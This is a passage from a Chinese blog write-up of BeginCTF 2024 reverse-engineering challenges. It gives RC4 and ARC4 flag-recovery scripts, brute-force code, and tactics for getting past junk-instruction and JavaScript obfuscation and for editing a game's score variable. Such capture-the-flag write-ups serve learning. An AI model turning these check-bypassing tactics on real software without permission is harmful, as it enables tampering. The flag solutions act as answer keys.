class="hljs-number">0xA3</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br>s=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x27</span>,<br>  <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xE1</span>,<br>  <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">s,a</span>):<br>    i=<span class="hljs-number">0</span><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>):<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        j=(j+s[i])%<span class="hljs-number">256</span><br>        s[i],s[j]=s[j],s[i]<br>        a[k]^=s[(s[i]+s[j])%<span class="hljs-number">256</span>]<br>    <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rc4(s_ni,a)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        flag+=<span class="hljs-built_in">chr</span>(a[i]+<span class="hljs-number">112</span>-<span class="hljs-built_in">ord</span>(s1[i]))<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>后面显示说上面每答对一个问题，就填充一部分s盒，所以我的绕过会使s盒有问题，怪不得说正向加密也会不对</p><p>正确的s盒，果然和我的有差别</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707439204823-edbdf260-1e3b-49fa-a3ce-be558529e539.png" class="" title="img"><p>也可以直接猜是rc4，因为我找不到rc4的初始化过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-string">b&quot;5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e&quot;</span><br><span class="hljs-comment"># tmp[i] = flag[i] + t[i]-112</span><br><span class="hljs-keyword">from</span> Crypto.Cipher.ARC4 <span class="hljs-keyword">import</span> *<br>enc = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x41</span>])<br>rc4 = new(t)<br>p = rc4.decrypt(enc)<br><span class="hljs-built_in">print</span>(p)<br>p = <span class="hljs-built_in">list</span>(p)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>    p[i] = (p[i]+<span class="hljs-number">112</span>-t[i])&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(p))<br></code></pre></td></tr></table></figure><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707441120328-53d83018-9ea2-44fe-aa4f-fa2e2de7cb8f.png" class="" title="img"><p>还可以直接交叉引用（x）找资源</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662434882-6feb5db8-f44a-40fa-8ec9-8b44a01888b6.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662422315-caff5912-babb-4e66-bcc5-6ee6be8f6c4d.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662480862-2d632a90-b003-4300-9d15-2c5f2dea269e.png" class="" title="img"><h2 id="superguesser-1"><a href="#superguesser-1" class="headerlink" title="superguesser-1"></a>superguesser-1</h2><p>有很多这样的花指令，反编译错误在数据后面</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707117897382-e58f2155-9ef6-466c-869a-4461f6d67594.png" class="" title="img"><p>转化为数据之后无法创建函数</p><p>可能用脚本去花指令？</p><p>加了XObf混淆器</p><p>下硬件断点可以在这些字符串被引用的时候断下来</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442599961-93f1f62a-e681-4f3b-b0fa-10779f6d4dee.png" class="" title="img"><p>可以看到停在了输入</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442732300-157a7c9c-9f40-4def-b496-c0a92d0d830b.png" class="" title="img"><p>不断ctrl+f7（找函数调用关系）</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442802923-b739e556-ff29-4b2a-824f-fbe59734c8de.png" class="" title="img"><p>直接猜异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458525652-680dcd9a-f6c9-443b-9571-2c9bc92e4d5f.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458587664-2288be2f-1fbf-48f6-bb05-c1d12bbd0050.png" class="" title="img"><h2 id="ezpython-1"><a href="#ezpython-1" class="headerlink" title="ezpython-1"></a>ezpython-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120887922-79327588-3ce5-47ca-889c-07719f070107.png" class="" title="img"><p>找不到key和enc，要去secret.pyc里找</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660671628-821c57a7-deef-4336-8d0c-1258c19ebb75.png" class="" title="img"><p>这就要求必须用python3.8反编译</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660607445-846ae1d4-c518-4704-8444-17962f2f62fc.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660956117-41b3e31e-53b3-44e7-b875-4717d0303fe7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661391820-58a10778-8bae-4a47-8464-5f800a4d648e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661489059-a1e589b1-a24c-49bf-a156-87d8278485ee.png" class="" title="img"><p>也可以直接大厨</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661564081-3c191d71-680f-4c7a-85dc-b41c9b0ac2d5.png" class="" title="img"><h2 id="stick-game-1"><a href="#stick-game-1" class="headerlink" title="stick game-1"></a>stick game-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120977289-6e7c1f46-bcd4-4234-b46a-ebd2d1c5d516.png" class="" title="img"><p>类似于跳一跳</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704152734-271b3e52-99a7-4c9d-ba16-b11d4c98fbfa.png" class="" title="img"><p>有obfus混淆</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704373259-e33d8342-37ad-4ccc-9e87-3e3abb363947.png" class="" title="img"><p>用网站去混淆</p><p><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704572575-bd25beb4-6c1d-4211-b526-b57cfa846d3c.png" class="" title="img"><p>一开始let score&#x3D;0,后面会resetGame</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719106980-8d0bacee-1c6e-4562-846c-0fa381c27f4a.png" class="" title="img"><p>直接去改关键词score，发现分数好像没变</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718134832-1c26d106-c740-403c-a92e-c0f2eb9a921f.png" class="" title="img"><p>要么去case6score+&#x3D;99999999</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720431663-2bee53a4-4c7a-4814-b092-b4519a7d910d.png" class="" title="img"><p>要么去改scoreElement，本质上还是score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718559473-d7e47894-cce2-44bc-b222-bf53e08dd3c3.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718715247-bff32408-cd5a-49de-bb61-7174314e8a34.png" class="" title="img"><p>死了才能获得flag</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719633093-d0beac54-2de3-4156-a768-47b095f1bd86.png" class="" title="img"><p>在html界面找到元素下断点，然后玩游戏立刻就能找到真正的score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720590048-5302baf7-f35e-47e1-90da-6bdf35dbf34a.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720616352-aa4c715a-a434-450b-aef4-fa190d33fb0a.png" class="" title="img"><h2 id="arc-1"><a href="#arc-1" class="headerlink" title="arc-1"></a>arc-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121222466-68e10aee-9032-4ac8-af06-5ca26385b020.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707962263700-ab40b4a7-45cb-4513-b373-5ff93471bfa7.png" class="" title="img"><p>大致来说就是字典太多，pydc反编译不了，我这里用python3.8.3编译，用anconda默认的3.8.13不行</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707964240587-17304ea3-4469-4d36-9783-74cd9e22e384.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965179736-105d7d87-bd35-49ee-b1dc-c583994edf67.png" class="" title="img"><p>一行行运行，得到类似结果</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965467955-bbf9d5eb-803c-49f6-ad53-fdc1570f8d21.png" class="" title="img"><p>最终是list里又是list</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965981359-7e524d61-b5d9-402a-a372-f7d8b3cc64c4.png" class="" title="img"><p>替换之后发现是3维列表</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707978844528-72da01e6-a317-49d8-b4d6-744c5f4b5d19.png" class="" title="img"><p>最后也就是这个样子，不懂的可以问gpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span><br>(<br>    <span class="hljs-built_in">all</span><br>    (<br>        [<br>            [data][a][d] == e <br>            <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>            (<br>                [<br>                    [<span class="hljs-built_in">int</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">sum</span>((<span class="hljs-built_in">ord</span>(b) &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - a ^ c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)] <br>                    <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>                    (<br>                        <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+]Flag: &#x27;</span>)<br>                    )<br>                ]<br>            ) <br>            <span class="hljs-keyword">for</span> d,e <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span> <span class="hljs-comment">#迭代器</span><br>            (<br>                (<span class="hljs-built_in">enumerate</span>(b))<br>            )<br>        ]<br>    )<br></code></pre></td></tr></table></figure><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span 